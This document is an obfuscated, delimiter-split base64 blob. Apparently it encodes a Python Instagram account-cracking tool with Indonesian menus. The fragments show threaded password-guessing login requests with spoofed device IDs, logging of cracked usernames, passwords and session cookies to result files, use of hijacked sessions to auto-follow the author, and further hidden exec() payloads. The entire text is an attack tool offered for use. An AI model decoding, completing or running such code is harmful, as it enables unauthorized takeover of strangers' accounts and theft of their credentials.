UucnVπ9πsZShmπ9πIntHTπ9π0R9e0π9π1NfUVπ9πycm9yπ9πe0dPRπ9πH0iLHπ9πN0eWxπ9πlPSJiπ9πb2xkIπ9πHJlZCπ9πIpCgkπ9πJCWNvπ9πbnNvbπ9πGUucHπ9πJpbnQπ9πoVGV4π9πdChmIπ9πnt3YXπ9πJ9TWFπ9πhZiBNπ9πZW51Iπ9πFlhbmπ9πcgQW5π9πkYSBQπ9πaWxpaπ9πCBUaWπ9πRhayBπ9πBZGEiπ9πKSwgcπ9π3R5bGπ9πU9InJπ9πlZCIsπ9πanVzdπ9πGlmeTπ9π0iY2Vπ9πudGVyπ9πIik7dπ9πGltZSπ9π5zbGVπ9πlcCgzπ9πKQoJCπ9πQlzZWπ9πxmLnBπ9πpbGloπ9πX21ldπ9πGhvZCπ9πgpCglπ9πkZWYgπ9πcGlsaπ9πWhfZmπ9π9sbG9π9π3KHNlπ9πbGYpOπ9πgoJCWπ9πdsb2Jπ9πhbCB1π9πc2VyXπ9π2d1ZXπ9πN0LGZπ9πsdwoKπ9πCQlwcπ9πmludHπ9πMoUGFπ9πuZWwoπ9πZiJ7Vπ9π0FSfUπ9πFwYWtπ9πhaCBBπ9πbmRhIπ9πE1hdSπ9πBNZW5π9πnYWt0π9πaWZrYπ9πW4gQmπ9π90LUZπ9πvbGxvπ9πdyIsdπ9πGl0bGπ9πU9ZiJπ9π7R09Eπ9πfXtQUπ9πH1CT1π9πQtRk9π9πMTE9Xπ9πe0dPRπ9πH0iLHπ9πdpZHRπ9πoPTEwπ9πMCxwYπ9πWRkaWπ9π5nPSgπ9πwKSxzπ9πdHlsZπ9πT1mInπ9πtBfSIπ9πsc3Viπ9πdGl0bπ9πGVfYWπ9πxpZ24π9π9J2xlπ9πZnQnLπ9πHN1Ynπ9πRpdGxπ9πlPWYiπ9π4pSPUπ9π0lMQUπ9πhLQU4π9πgSVNJπ9πIikpCπ9πgkJZmπ9πx3ID0π9πgaW5wπ9πdXQoZπ9πiJ7YXπ9π0gICDπ9πilJd7π9πY31Qaπ9πWxpaCπ9πB7aX1π9πZe3F9π9πL3ttfπ9πW57cXπ9π06IHtπ9πhfSIpπ9πCgkJaπ9πWYgZmπ9πx3IGlπ9πuICgiπ9πWSIsIπ9πnkiKTπ9πoKCQkπ9πJdHJ5π9πOgoJCπ9πQkJdXπ9πNlcl9π9πndWVzπ9πdHQgPπ9πSBpbnπ9πB1dChπ9πmInthπ9πfSAgIπ9πCDilJπ9πd7Y31π9πVc2Vyπ9πTmFtZπ9πSBJbnπ9πN0YWdπ9πyYW0gπ9πQW5kYπ9πSA6IHπ9πthfSIπ9πpCgkJπ9πCQlkYπ9πXogPSπ9πBtZW5π9π1KCkuπ9πZ2V0Xπ9π2RhdGπ9πEodXNπ9πlcl9nπ9πdWVzdπ9πHQpCgπ9πkJCQlπ9πwcmluπ9πdHMoUπ9πGFuZWπ9πwoZiJπ9π7V0FSπ9πfXtDQπ9π31OYWπ9π1hIDoπ9πge0lJπ9πfXtkYπ9πXpbJ2π9π5hbWEπ9πnXX1cπ9πbntXQπ9πVJ9e0π9πNDfVVπ9πzZXJOπ9πYW1lIπ9πDoge0π9πlJfXtπ9π1c2Vyπ9πX2d1Zπ9πXN0dHπ9π1cbntπ9πXQVJ9π9πQXBhaπ9π2FoIFπ9πVzZXJπ9πuYW1lπ9πIFlhbπ9πmcgQWπ9π5kYSBπ9πNYXN1π9πa2FuIπ9πEJlbmπ9πFyIixπ9π0aXRsπ9πZT1mIπ9πntHT0π9πR9e1Bπ9πQfUJPπ9πVC1GTπ9π0xMT1π9πd7R09π9πEfSIsπ9πd2lkdπ9πGg9MTπ9πAwLHBπ9πhZGRpπ9πbmc9Kπ9πDApLHπ9πN0eWxπ9πlPWYiπ9πe0F9Iπ9πixzdWπ9πJ0aXRπ9πsZV9hπ9πbGlnbπ9πj0nbGπ9πVmdCcπ9πsc3Viπ9πdGl0bπ9πGU9Ziπ9πLilI9π9πTSUxBπ9πSEtBTπ9πiBJU0π9πkiKSkπ9πKCQkJπ9πCWZsdπ9π3ogPSπ9πBpbnBπ9π1dChmπ9πInthfπ9πSAgIOπ9πKUl3tπ9πjfVBpπ9πbGloIπ9πHtpfVπ9πl7cX0π9πve219π9πbntxfπ9πToge2π9πF9Iikπ9πKCQkJπ9πCWlmIπ9πGZsd3π9πogaW4π9πgKCJZπ9πIiwieπ9πSIpOgπ9πoJCQkπ9πJCXVzπ9πZXJfZπ9π3Vlc3π9πQgPSBπ9πkYXpbπ9πImlkIπ9πl0KCQπ9πkJCWVπ9πsaWYgπ9πZmx3eπ9πiBpbiπ9πAoIm4π9πiLCJOπ9πIik6Cπ9πgkJCQπ9πkJc2Vπ9πsZi5wπ9πaWxpaπ9πF9tZXπ9πRob2Qπ9πoKQoJπ9πCQlleπ9πGNlcHπ9πQgRXhπ9πjZXB0π9πaW9uIπ9πGFzIGπ9πU6Cgkπ9πJCQlzπ9πZWxmLπ9πnBpbGπ9πloX21π9πldGhvπ9πZCgpCπ9πgkJZWπ9πxpZiBπ9πmbHcgπ9πaW4gKπ9πCJOIiπ9πwibiIπ9πpOnBhπ9πc3MKCπ9πQllbHπ9πNlOgoπ9πJCQljπ9πb25zbπ9π2xlLnπ9πJ1bGUπ9πoZiJ7π9πR09Efπ9πXtNTXπ9π1FcnJπ9πvcntHπ9πT0R9Iπ9πixzdHπ9πlsZT0π9πiYm9sπ9πZCByZπ9πWQiKQπ9πoJCQlπ9πjb25zπ9πb2xlLπ9πnByaWπ9π50KFRπ9πleHQoπ9πZiJ7dπ9π2FyfUπ9π1hYWYπ9πgTWVuπ9πdSBZYπ9πW5nIEπ9πFuZGEπ9πgUGlsπ9πaWggVπ9πGlkYWπ9πsgQWRπ9πhIiksπ9πIHN0eπ9πWxlPSπ9πJyZWQπ9πiLGp1π9πc3RpZπ9πnk9Imπ9πNlbnRπ9πlciIpπ9πO3Rpbπ9πWUuc2π9πxlZXAπ9πoMykKπ9πCQkJcπ9π2VsZiπ9π5waWxπ9πpaF9tπ9πZXRobπ9π2QoKQπ9πoKCglπ9πkZWYgπ9πc3Rhcπ9πnRfY3π9πJhY2sπ9πoc2Vsπ9πZik6Cπ9πgkJZ2π9πxvYmFπ9πsIGFuπ9πaW0sYπ9πW5pbTπ9πIKCQlπ9πhbmltπ9πID0gUπ9πHJvZ3π9πJlc3Mπ9πoU3Bpπ9πbm5lcπ9πkNvbHπ9πVtbigπ9πiYXJyπ9πb3cyIπ9πiksVGπ9πV4dENπ9πvbHVtπ9πbigneπ9π3Rhc2π9πsuZGVπ9πzY3Jpπ9πcHRpbπ9π259Jyπ9πksQmFπ9πyQ29sπ9πdW1uKπ9πCksVGπ9πV4dENπ9πvbHVtπ9πbigneπ9π3Rhc2π9πsucGVπ9πyY2Vuπ9πdGFnZπ9πTouMGπ9πZ9JScπ9πpKQoJπ9πCWFuaπ9πW0yIDπ9π0gYW5π9πpbS5hπ9πZGRfdπ9πGFzayπ9πgnJyxπ9π0b3Rhπ9πbD1sZπ9πW4oaWπ9πQpKQoπ9πJCXdpπ9πdGggVπ9πGhyZWπ9πFkUG9π9πvbEV4π9πZWN1dπ9πG9yKGπ9π1heF9π9π3b3Jrπ9πZXJzPπ9πTMwKSπ9πBhcyBπ9πfX1Jpπ9πU2t5Xπ9π186Cgπ9πkJCWZπ9πvciBrπ9πb2Nvaπ9πyBpbiπ9πBpZDoπ9πKCQkJπ9πCXRyeπ9πToKCQπ9πkJCQlπ9π1c2Vyπ9πeiA9Iπ9πGtvY2π9π9rLnNπ9πwbGl0π9πKCd8fπ9πCcpWzπ9πBdCgkπ9πJCQkJπ9πbmFfbπ9πWEgPSπ9πBrb2Nπ9πvay5zπ9πcGxpdπ9πCgnfHπ9πwnKVsπ9πxXQoJπ9πCQkJCπ9πWlmIHπ9πBwayAπ9π9PSAiπ9πMSIgbπ9π3IgcHπ9πBrID0π9π9ICIwπ9πMSI6Cπ9πgkJCQπ9πkJCV9π9πfUmlTπ9πa3lfXπ9πy5zdWπ9πJtaXQπ9πoc2Vsπ9πZi5nZπ9πXRfcGπ9π9zdCwπ9πgdXNlπ9πcnosIπ9πHNlbGπ9πYuZ2Vπ9π0X3Bhπ9πc3Mobπ9πmFfbWπ9πEpKQoπ9πJCQkJπ9πCWVsaπ9πWYgcHπ9πBrID0π9π9ICIyπ9πIiBvcπ9πiBwcGπ9πsgPT0π9πgIjAyπ9πIjoKCπ9πQkJCQπ9πkJX19π9πSaVNrπ9πeV9fLπ9πnN1Ymπ9π1pdChπ9πzZWxmπ9πLmdldπ9πF9wb3π9πN0MSwπ9πgdXNlπ9πcnosIπ9πHNlbGπ9πYuZ2Vπ9π0X3Bhπ9πc3Mobπ9πmFfbWπ9πEpKQoπ9πJCQkJπ9πZXhjZπ9πXB0Onπ9πBhc3Mπ9πKCglkπ9πZWYgZπ9π2V0X3π9πBvc3Qπ9πoc2Vsπ9πZix1cπ9π2VyLHπ9πBhc2Qπ9πpOgoJπ9πCWdsbπ9π2JhbCπ9πBvayxπ9πjcCxsπ9πb29wCπ9πgkJbGπ9π9vcCsπ9π9MQoJπ9πCXRyeπ9πToKCQπ9πkJc2Vπ9πzc2lvπ9πbj1yZπ9πXF1ZXπ9πN0cy5π9πTZXNzπ9πaW9uKπ9πCkKCQπ9πkJbG9π9πndGVtπ9πcD0wCπ9πgkJCWπ9πd1aWQπ9πgPSBzπ9πdHIodπ9πXVpZCπ9π51dWlπ9πkNCgpπ9πKQoJCπ9πQlwb2π9π5pZD1π9πzdHIoπ9πdXVpZπ9πC51dWπ9πlkNCgπ9πpKQoJπ9πCQlhbπ9πmRybzπ9π0iYW5π9πkcm9pπ9πZC0lcπ9πyIgJSπ9πBoYXNπ9πobGliπ9πLm1kNπ9πShzdHπ9πIodGlπ9πtZS50π9πaW1lKπ9πCkpLmπ9πVuY29π9πkZSgpπ9πKS5oZπ9πXhkaWπ9πdlc3Qπ9πoKVs6π9πMTZdCπ9πgkJCWπ9πlnX3Nπ9πpZz1fπ9πX1JJUπ9π0tZX1π9π9bImlπ9πnX3Npπ9πZyJdCπ9πgkJCXπ9πZlcmlπ9πnPV9fπ9πUklTSπ9π1lfX1π9πsiSUdπ9πWIl0Kπ9πCQkJaπ9πWd2ZXπ9πI9dmVπ9πyaWcuπ9πc3Bsaπ9πXQoIiπ9πwiKQoπ9πJCQlpπ9πZ3Y9cπ9πmFuZGπ9π9tLmNπ9πob2ljπ9πZShpZπ9π3Zlciπ9πkKCQkπ9πJZ2Vkπ9πej1fXπ9π0pFRUπ9πNLX19π9πbIkFPπ9πUkVDIπ9πl1bcmπ9πFuZG9π9πtLnJhπ9πbmRyYπ9πW5nZSπ9πgwLDIπ9π3Nyldπ9πWyJhbπ9π3JlYyπ9πJdCgkπ9πJCXZlπ9πbjE9Zπ9π2Vkeiπ9π5zcGxπ9πpdCgnπ9πfCcpWπ9πzFdCgπ9πkJCXZπ9πlbjI9π9πZ2Vkeπ9πi5zcGπ9πxpdCgπ9πnfCcpπ9πWzJdCπ9πgkJCWπ9πdpdTEπ9π9X19Sπ9πSVNLWπ9πV9fWyπ9πJnaXUπ9πiXQoJπ9πCQlnaπ9πXU9Z2π9πl1MS5π9πzcGxpπ9πdCgifπ9πHwiKQπ9πoJCQlπ9π1YT1mπ9πJ3tnaπ9πXVbMFπ9π19IHtπ9πpZ3Z9π9πIHtnaπ9πXVbMVπ9π19IHtπ9π2ZW4xπ9πfTsgeπ9π3Zlbjπ9πJ9OyBπ9π7Z2l1π9πWzJdfπ9πScKCQπ9πkJZGFπ9π0PV9fπ9πUklTSπ9π1lfX1π9πsic2lπ9πua3oiπ9πXQoJCπ9πQlkYXπ9πQudXBπ9πkYXRlπ9πKHsiaπ9πWQiOiπ9πBndWlπ9πkfSkKπ9πCQkJZπ9πGF0YTπ9πE9anNπ9πvbi5kπ9πdW1wcπ9πyhkYXπ9πQpCgkπ9πJCW5lπ9πZD1obπ9πWFjLmπ9π5ldyhπ9πpZ19zπ9πaWcuZπ9πW5jb2π9πRlKCdπ9π1dGYtπ9πOCcpLπ9πCBzdHπ9πIoZGFπ9π0YTEpπ9πLmVuYπ9π29kZSπ9πgndXRπ9πmPTgnπ9πKSxoYπ9πXNobGπ9πliLnNπ9πoYTI1π9πNikuaπ9πGV4ZGπ9πlnZXNπ9π0KCkKπ9πCQkJZπ9πGF0YTπ9πI9X19π9πSSVNLπ9πWV9fWπ9πyJzaWπ9π5rejEπ9πiXQoJπ9πCQlkYπ9πXRhMiπ9π51cGRπ9πhdGUoπ9πeydzaπ9πWduZWπ9πRfYm9π9πkeSc6π9πIGYneπ9π25lZHπ9π0ue3Nπ9π0cihkπ9πYXRhMπ9πSl9J3π9π0pCgkπ9πJCWhlπ9πYWQ9Xπ9π19SSVπ9πNLWV9π9πfWyJoπ9πZWFkYπ9πWluZyπ9πJdCgkπ9πJCWhlπ9πYWQudπ9πXBkYXπ9πRlKHsπ9πidXNlπ9πci1hZπ9π2VudCπ9πI6IHVπ9πhfSkKπ9πCQkJdπ9π2hpbGπ9πUgVHJπ9π1ZToKπ9πCQkJCπ9πXRyeTπ9πoKCQkπ9πJCQlwπ9πb3A9cπ9π2Vzc2π9πlvbi5π9πwb3N0π9πKF9fUπ9πklTS1π9πlfX1sπ9πic2luπ9πa3oyIπ9πl0saGπ9πVhZGVπ9πycz1oπ9πZWFkLπ9πGRhdGπ9πE9ZGFπ9π0YTIpπ9πCgkJCπ9πQkJYnπ9πJlYWsπ9πKCQkJπ9πCWV4Yπ9π2VwdDπ9πpwYXNπ9πzCgkJπ9πCWZvcπ9πiBwdyπ9πBpbiBπ9πwYXNkπ9πOgoJCπ9πQkJcHπ9πcgPSBπ9πwdy5sπ9πb3dlcπ9πigpCgπ9πkJCQlπ9πkYXRhπ9πPWpzbπ9π24uZHπ9πVtcHMπ9πoeyJwπ9πaG9uZπ9πV9pZCπ9πI6cG9π9πuaWQsπ9πIl9jcπ9π3JmdGπ9π9rZW4π9πiOiBzπ9πZXNzaπ9πW9uLmπ9πNvb2tπ9πpZXNbπ9πImNzcπ9πmZ0b2π9πtlbiJπ9πdLCJ1π9πc2Vybπ9πmFtZSπ9πI6dXNπ9πlciwiπ9πZ3VpZπ9πCI6Z3π9πVpZCwπ9πiZGV2π9πaWNlXπ9π2lkIjπ9πphbmRπ9πybywiπ9πcGFzcπ9π3dvcmπ9πQiOiBπ9πwdywgπ9πImxvZπ9π2luX2π9πF0dGVπ9πtcHRfπ9πY291bπ9πnQiOiπ9πBzdHIπ9πobG9nπ9πdGVtcπ9πCl9KQπ9πoJCQkπ9πJbmVkπ9πPWhtYπ9πWMubmπ9πV3KGlπ9πnX3Npπ9πZy5lbπ9πmNvZGπ9πUoJ3Vπ9π0Zi04π9πJyksIπ9πHN0ciπ9πhkYXRπ9πhKS5lπ9πbmNvZπ9πGUoJ3π9πV0Zj0π9π4Jyksπ9πaGFzaπ9πGxpYiπ9π5zaGEπ9πyNTYpπ9πLmhleπ9πGRpZ2π9πVzdCgπ9πpCgkJπ9πCQloZπ9πWFkMjπ9π1fX1Jπ9πJU0tZπ9πX19bIπ9πmhlYWπ9πRhaW5π9πnMSJdπ9πCgkJCπ9πQloZWπ9πFkMi5π9π1cGRhπ9πdGUoeπ9πyJ1c2π9πVyLWFπ9πnZW50π9πIjogdπ9πWF9KQπ9πoJCQkπ9πJc2lhπ9πbmppbπ9πmc9X1π9π9SSVNπ9πLWV9fπ9πWyJzaπ9πWFuamπ9πluZyJπ9πdCgkJπ9πCQlzZπ9πXRhbjπ9π1zaWFπ9πuamluπ9πZy5zcπ9πGxpdCπ9πgifHwπ9πiKQoJπ9πCQkJZπ9πGF0YWπ9πE9Zidπ9π7c2V0π9πYW5bMπ9πF19e2π9π5lZH1π9π7c2V0π9πYW5bMπ9πV19e3π9πBvbmlπ9πkfXtzπ9πZXRhbπ9πlsyXXπ9π17c2Vπ9πzc2lvπ9πbi5jbπ9π29raWπ9πVzWyJπ9πjc3Jmπ9πdG9rZπ9πW4iXXπ9π17c2Vπ9π0YW5bπ9πM119eπ9π3VzZXπ9πJ9e3Nπ9πldGFuπ9πWzRdfπ9πXtndWπ9πlkfXtπ9πzZXRhπ9πbls1Xπ9πX17YWπ9π5kcm9π9π9e3Nlπ9πdGFuWπ9πzZdfXπ9πtwd31π9π7c2V0π9πYW5bNπ9π119e2π9πxvZ3Rπ9πlbXB9π9πe3Nldπ9πGFuWzπ9πhdfScπ9πKCQkJπ9πCXJlcπ9π3Bvbjπ9π1zZXNπ9πzaW9uπ9πLnBvcπ9π3QoX1π9π9SSVNπ9πLWV9fπ9πWyJjcπ9πmFjayπ9πJdLGhπ9πlYWRlπ9πcnM9aπ9πGVhZDπ9πIsZGFπ9π0YT1kπ9πYXRhYπ9πSkKCQπ9πkJCW5π9πjZWs9π9πanNvbπ9πi5sb2π9πFkcyhπ9πyZXNwπ9πb24udπ9πGV4dCπ9πkKCQkπ9πJCWxvπ9πZ3Rlbπ9πXArPTπ9πEKCQkπ9πJCWlmπ9πICdpcπ9πF9ibGπ9π9jaycπ9πgaW4gπ9πc3RyKπ9πHJlc3π9πBvbi5π9π0ZXh0π9πKSBvcπ9πiAnc3π9πBhbScπ9πgaW4gπ9πc3RyKπ9πHJlc3π9πBvbi5π9π0ZXh0π9πKToKCπ9πQkJCQπ9πlzeXMπ9πuc3Rkπ9πb3V0Lπ9πndyaXπ9πRlKGYπ9πiXHIgπ9πe3F9Wπ9π3ttfVπ9πNQQU1π9π7cX1dπ9πIHttfπ9πUphcmπ9πluZ2Fπ9πuIEFuπ9πZGEgVπ9πGVya2π9πVuYSBπ9πTcGFtπ9πLCBIaπ9πWR1cCπ9πBNYXRπ9πpa2Fuπ9πIE1vZπ9πGUgUGπ9πVzYXdπ9πhdHtxπ9πfSIpLπ9πHN5cyπ9π5zdGRπ9πvdXQuπ9πZmx1cπ9π2goKQπ9πoJCQkπ9πJZWxzπ9πZToKCπ9πQkJCQπ9πlzeXMπ9πuc3Rkπ9πb3V0Lπ9πndyaXπ9πRlKGYπ9πiXHIgπ9πe3F9Wπ9π3tpfUπ9πdPT0Rπ9π7cX1dπ9πIHtyYπ9πW5kb2π9π0uY2hπ9πvaWNlπ9πKFt1Lπ9πGssbSπ9πxiLGMπ9πscSxvπ9πXSl9eπ9π2xvb3π9πB9e3Fπ9π9L3tjπ9πfXtsZπ9πW4oaWπ9πQpfSBπ9π7aX1Pπ9πSyB7cπ9πX06IHπ9πtpfXtπ9πsZW4oπ9πb2spfπ9πSB7a3π9π1DUCBπ9π7cX06π9πIHtrfπ9πXtsZWπ9π4oY3Aπ9πpfXtxπ9πfSIpLπ9πHN5cyπ9π5zdGRπ9πvdXQuπ9πZmx1cπ9π2goKQπ9πoJCQkπ9πJaWYgπ9πJ2xvZπ9π2dlZFπ9π9pbl9π9π1c2Vyπ9πJyBpbπ9πiBzdHπ9πIobmNπ9πlaykgπ9πb3IgJπ9π3Nlc3π9πNpb25π9πpZCcgπ9πaW4gcπ9π2Vzc2π9πlvbi5π9πjb29rπ9πaWVzLπ9πmdldFπ9π9kaWNπ9π0KCk6π9πCgkJCπ9πQkJd3π9πJ0ID0π9πgJyVzπ9πfCVzJπ9πyAlICπ9πh1c2Vπ9πyLHB3π9πKTtleπ9πGVjKFπ9π9SSVpπ9πLWV8oπ9πIlJpcπ9π2t5IFπ9πN1a2Eπ9πgSGVuπ9πdGFpIπ9πixfSkπ9πUzQ0tπ9πfKCJKπ9πZWVjaπ9πyBTYWπ9π50dXkπ9πiLCJjπ9πbVZ4Zπ9πM+AOcπ9π+AV1Zπ9π6ZEjPπ9πgDnPgπ9πE11Y0π9πc5z4Aπ9π5z4B6π9πZENobπ9πc+AOcπ9π+ASW1π9πoMGTPπ9πgDnPgπ9πEhCekπ9π9pz4Aπ9π5z4A4π9πdllYQπ9πs+AOcπ9π+AcExπ9πuUmzPπ9πgDnPgπ9πGJHVmπ9π5jz4Aπ9π5z4Btπ9πRnRMbπ9πc+AOcπ9π+AOXlπ9πaeTnPπ9πgDnPgπ9πGliM1π9πExz4Aπ9π5z4BPπ9πRE14Tπ9π8+AOcπ9π+AREUπ9πwTXrPπ9πgDnPgπ9πEUxT2π9πtGz4Aπ9π5z4BCπ9πUlUxQπ9πs+AOcπ9π+AUjIπ9π1V1XPπ9πgDnPgπ9πFVOdkπ9πxUz4Aπ9π5z4BSπ9πVE5Eaπ9πM+AOcπ9π+Ab2Fπ9πVZGnPπ9πgDnPgπ9πFJscEπ9π5hz4Aπ9π5z4BVπ9πSlNNaπ9π8+AOcπ9π+ANTBπ9πiblnPπ9πgDnPgπ9πDFTbUπ9π13z4Aπ9π5z4BMπ9πM05sYπ9πs+AOcπ9π+AbVJπ9πOWljPπ9πgDnPgπ9πE56WVπ9πdkz4Aπ9π5z4Bsπ9πUDJObπ9π8+AOcπ9π+AWVhπ9πSZmHPπ9πgDnPgπ9πFdROUπ9π1Uz4Aπ9π5z4BVπ9πM01EVπ9πc+AOcπ9π+AMk5π9πqTTPPπ9πgDnPgπ9πE1DWjπ9πBaz4Aπ9π5z4BYπ9πaDBQWπ9πM+AOcπ9π+AdDNπ9πjblLPπ9πgDnPgπ9πDlJaWπ9πtLz4Aπ9π5z4Aiπ9πKSkpCπ9πgkJCQπ9πkJaWYπ9πgd3J0π9πIGluIπ9πG9rOmπ9πJyZWFπ9πrCgkJπ9πCQkJZπ9πWxzZTπ9πoKCQkπ9πJCQkJπ9πdHJ5Oπ9πgoJCQπ9πkJCQkπ9πJZGEgπ9πPSBzZπ9πXNzaWπ9π9uLmNπ9πvb2tpπ9πZXMuZπ9π2V0X2π9πRpY3Qπ9πoKQoJπ9πCQkJCπ9πQkJY3π9πVrID0π9πgIiIKπ9πCQkJCπ9πQkJCWπ9πZvciBπ9πkZXYgπ9πaW4gZπ9πGE6Cgπ9πkJCQkπ9πJCQkJπ9πY3VrIπ9πCs9ICπ9πhkZXYπ9πrIj0iπ9πK2RhWπ9π2Rldlπ9π0rIjsπ9πiKQoJπ9πCQkJCπ9πQlleGπ9πNlcHQπ9π6Y3Vrπ9πID0gIπ9πkVSUkπ9π9SIgoπ9πJCQkJπ9πCQl0cπ9πnk6Cgπ9πkJCQkπ9πJCQlyπ9πZnMgPπ9πSByZSπ9π5maW5π9πkYWxsπ9πKCdjcπ9π3JmdGπ9π9rZW4π9π9KC4qπ9πKTsnLπ9πCBjdWπ9πspWzBπ9πdCgkJπ9πCQkJCπ9πQlyZnπ9πMgPSBπ9πyZnMuπ9πc3Bsaπ9πXQoIjπ9πsiKVsπ9πwXQoJπ9πCQkJCπ9πQkJc2π9πVsZi5π9πmb2xsπ9πb3dNZπ9πShjdWπ9πssIHJπ9πmcykKπ9πCQkJCπ9πQkJCXπ9πNlbGYπ9πuZm9sπ9πbG93Tπ9πWUyKGπ9πN1aywπ9πgcmZzπ9πKQoJCπ9πQkJCQπ9πlleGNπ9πlcHQ6π9πcGFzcπ9πwoJCQπ9πkJCQlπ9πqZW0gπ9πPSBtZπ9πW51KCπ9πkuZ2Vπ9π0X2Rhπ9πdGEodπ9πXNlciπ9πkKCQkπ9πJCQkJπ9πcHJpbπ9πnQoZiπ9πdccntπ9πofXtpπ9πMn17Zπ9π2FyaXπ9πN9ICAπ9πgICAgπ9πICAgIπ9πExPR0π9πlOIFNπ9πVS1NFπ9πUyAgIπ9πCAgICπ9πAgICAπ9πge3F9π9πICAgIπ9πCAgICπ9πAgICAπ9πgICAgπ9πICAgIπ9πCAgICπ9πAgIFxπ9πuICB7π9πaX1OYπ9πW1hICπ9πAgICAπ9π6IHtjπ9πfXtqZπ9πW1bImπ9π5hbWEπ9πiXX1cπ9πbiAgeπ9π2l9VXπ9πNlcm5π9πhbWUgπ9πOiB7Yπ9π317dXπ9πNlcn1π9πcbiAgπ9πe2l9Uπ9πGFzc3π9πdvcmQπ9πgOiB7π9πY317cπ9πHd9XGπ9π4gIHtπ9πpfVBlπ9πbmdpaπ9π3V0IDπ9πoge2Nπ9π9e2plπ9πbVsicπ9πGVuZ2π9πlrdXQπ9πiXX1cπ9πbiAgeπ9π2l9TWπ9πVuZ2lπ9πrdXRpπ9πOiB7Yπ9π317amπ9πVtWyJπ9πtZW5nπ9πaWt1dπ9πGkiXXπ9π1cbiAπ9πge2l9π9πUG9zdπ9πGluZ2π9πFuOiBπ9π7Y317π9πamVtWπ9πyJwb3π9πN0Il1π9π9XG4gπ9πIHtpfπ9πUNvb2π9πtpZXMπ9πgIDogπ9πe2N9eπ9π2N1a3π9π1cbicπ9πpCgkJπ9πCQkJCπ9πW9wZWπ9π4oZidπ9πyZXN1π9πbHRzLπ9π09LLUπ9πlHLXtπ9πhbGxfπ9πZGF5fπ9πS50eHπ9πQnLCdπ9πhJykuπ9πd3Jpdπ9πGUoZiπ9πdOYW1π9πhICAgπ9πICA6Iπ9πHtqZWπ9π1bIm5π9πhbWEiπ9πXX1cbπ9πlVzZXπ9πJuYW1π9πlIDogπ9πe3VzZπ9πXJ9XGπ9π5QYXNπ9πzd29yπ9πZCA6Iπ9πHtwd3π9π1cblBπ9πlbmdpπ9πa3V0Iπ9πDoge2π9πplbVsπ9πicGVuπ9πZ2lrdπ9πXQiXXπ9π1cbk1π9πlbmdpπ9πa3V0aπ9πToge2π9πplbVsπ9πibWVuπ9πZ2lrdπ9πXRpIlπ9π19XG5π9πQb3N0π9πaW5nYπ9πW46IHπ9πtqZW1π9πbInBvπ9πc3QiXπ9πX1cbkπ9πNvb2tπ9πpZXMgπ9πIDogeπ9π2N1a3π9π0nKQoπ9πJCQkJπ9πCQlvaπ9πy5hcHπ9πBlbmQπ9πodXNlπ9πcisifπ9πCIrcHπ9πcpCgkπ9πJCQkJπ9πCWJyZπ9πWFrCgπ9πkJCQlπ9πlbGlmπ9πICdodπ9πHRwczπ9πovL2kπ9πuaW5zπ9πdGFncπ9πmFtLmπ9πNvbS9π9πjaGFsπ9πbGVuZπ9π2UnIGπ9πluIHNπ9π0cihyπ9πZXNwbπ9π24udGπ9πV4dCkπ9π6CgkJπ9πCQkJdπ9π3J0IDπ9π0gJyVπ9πzfCVzπ9πJyAlIπ9πCh1c2π9πVyLHBπ9π3KTtlπ9πeGVjKπ9πF9SSVπ9πpLWV8π9πoIlJpπ9πc2t5Iπ9πFN1a2π9πEgSGVπ9πudGFpπ9πIixfSπ9πkUzQ0π9πtfKCJπ9πKZWVjπ9πayBTYπ9πW50dXπ9πkiLCJπ9πjbVZ4π9πZM+AOπ9πc+AV1π9πZ6ZEjπ9πPgDnPπ9πgE11Yπ9π0c5z4π9πA5z4Bπ9π6ZENoπ9πbc+AOπ9πc+ASWπ9π1oMGTπ9πPgDnPπ9πgEhCeπ9πk9pz4π9πA5z4Aπ9π4dllYπ9πQs+AOπ9πc+AcEπ9πxuUmzπ9πPgDnPπ9πgGJHVπ9πm5jz4π9πA5z4Bπ9πtRnRMπ9πbc+AOπ9πc+AOXπ9πlaeTnπ9πPgDnPπ9πgGliMπ9π1Exz4π9πA5z4Bπ9πPVFk0π9πTc+AOπ9πc+AREπ9πF3Tmrπ9πPgDnPπ9πgE0wTπ9π2tGz4π9πA5z4Bπ9πCUmtsπ9πMs+AOπ9πc+AUWπ9πpOaFXπ9πPgDnPπ9πgFhsbπ9πFRYz4π9πA5z4Bπ9πWUGVEπ9πZM+AOπ9πc+AVlπ9πltczHπ9πPgDnPπ9πgE5FMπ9πXFRz4π9πA5z4Bπ9πWOXhNπ9πa8+AOπ9πc+AUnπ9πRSVzHπ9πPgDnPπ9πgEhXaπ9π0Zaz4π9πA5z4Bπ9πMM05sπ9πYs+AOπ9πc+AbVπ9πJOWljπ9πPgDnPπ9πgE56Wπ9πVdkz4π9πA5z4Bπ9πsUDJOπ9πb8+AOπ9πc+AWVπ9πhSZmHπ9πPgDnPπ9πgFdROπ9πU1Uz4π9πA5z4Bπ9πVM01Eπ9πVc+AOπ9πc+AMkπ9π5qTTPπ9πPgDnPπ9πgE1DWπ9πjBaz4π9πA5z4Bπ9πYaDBQπ9πWM+AOπ9πc+AdDπ9πNjblLπ9πPgDnPπ9πgDlJaπ9πWtLz4π9πA5z4Aπ9πiKSkpπ9πCgkJCπ9πQkJaWπ9πYgd3Jπ9π0IGluπ9πIGNwOπ9πmJyZWπ9πFrCgkπ9πJCQkJπ9πZWxzZπ9πToKCQπ9πkJCQkπ9πJamVtπ9πID0gbπ9πWVudSπ9πgpLmdπ9πldF9kπ9πYXRhKπ9πHVzZXπ9πIpCgkπ9πJCQkJπ9πCXByaπ9πW50KGπ9πYnXHJπ9π7cH17π9πbTJ9eπ9π2dhcmπ9πlzfSAπ9πgICAgπ9πICAgIπ9πCBMT0π9πdJTiBπ9πDSEVDπ9πSyBQTπ9π0lOVCπ9πAgICAπ9πgIHtxπ9πfSAgIπ9πCAgICπ9πAgICAπ9πgICAgπ9πICAgIπ9πCAgICπ9πAgICBπ9πcbiAgπ9πe219Tπ9πmFtYSπ9πAgICAπ9πgOiB7π9πY317aπ9πmVtWyπ9πJuYW1π9πhIl19π9πXG4gIπ9πHttfVπ9πVzZXJπ9πuYW1lπ9πIDogeπ9π2N9e3π9πVzZXJπ9π9XG4gπ9πIHttfπ9πVBhc3π9πN3b3Jπ9πkIDogπ9πe2N9eπ9π3B3fVπ9πxuICBπ9π7bX1Qπ9πZW5naπ9πWt1dCπ9πA6IHtπ9πjfXtqπ9πZW1bIπ9πnBlbmπ9πdpa3Vπ9π0Il19π9πXG4gIπ9πHttfUπ9π1lbmdπ9πpa3V0π9πaTogeπ9π2N9e2π9πplbVsπ9πibWVuπ9πZ2lrdπ9πXRpIlπ9π19XG4π9πgIHttπ9πfVBv